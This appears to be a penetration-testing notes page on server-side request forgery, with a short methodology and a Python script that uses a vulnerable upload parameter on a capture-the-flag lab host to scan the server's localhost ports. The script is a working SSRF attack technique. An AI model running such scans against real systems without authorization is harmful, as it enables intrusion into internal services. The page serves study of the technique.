---
description: Server Side Request Reforgery
icon: raygun
---

# SSRF

{% hint style="info" %}
### <mark style="color:red;">`Methodology`</mark>

1. <mark style="color:purple;">Watch for any unexpected redirects, especially to internal or private</mark> <mark style="color:orange;">**`IP`**</mark><mark style="color:purple;">. These can often indicate a vulnerable</mark> <mark style="color:orange;">**`SSRF`**</mark> <mark style="color:purple;">endpoint.</mark>
2. <mark style="color:purple;">Use a listener to see if the server is initiating outbound connections. This helps confirm if the server is making requests to external resources.</mark>
3. <mark style="color:purple;">Pay special attention to which ports are open on the</mark> <mark style="color:orange;">**`localhost`**</mark><mark style="color:purple;">, as they might indicate internal services that can be targeted.</mark>
4. <mark style="color:purple;">If you discover that there are open ports on internal services, try querying them via the vulnerable parameter. This could reveal sensitive information, such as metadata, headers, or responses that were not intended to be exposed.</mark>
5. <mark style="color:purple;">If the</mark> <mark style="color:orange;">**`SSRF`**</mark> <mark style="color:purple;">vulnerability exposes endpoints, like internal</mark> <mark style="color:orange;">**`API`**</mark><mark style="color:purple;">, try querying those endpoints from the vulnerable parameter.</mark>&#x20;
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:red;">`Port Scanner`</mark>

* <mark style="color:purple;">Use this script to enumerate open ports on the</mark> <mark style="color:orange;">**`localhost`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```python
#!/usr/bin/python3
import requests

with open("a", 'wb') as f:
    f.write(b'')

for port in range(1, 65535):
    with open("a", 'rb') as file:
        data_post = {"bookurl": f"http://127.0.0.1:{port}"}   # Vulnerable Parameter
        data_file = {"bookfile": file}    # Mandatory Parameter
    try:
        r = requests.post("http://editorial.htb/upload-cover", files=data_file, data=data_post) # Vunerable URL
        if not r.text.strip().endswith('.jpeg'):     # Filtering response
            print(f"{port} --- {r.text}")
    except requests.RequestException as e:
        print(f"Error on port {port}: {e}")
```
{% endcode %}

* <mark style="color:purple;">Modify the parameters for your use case.</mark>
{% endhint %}
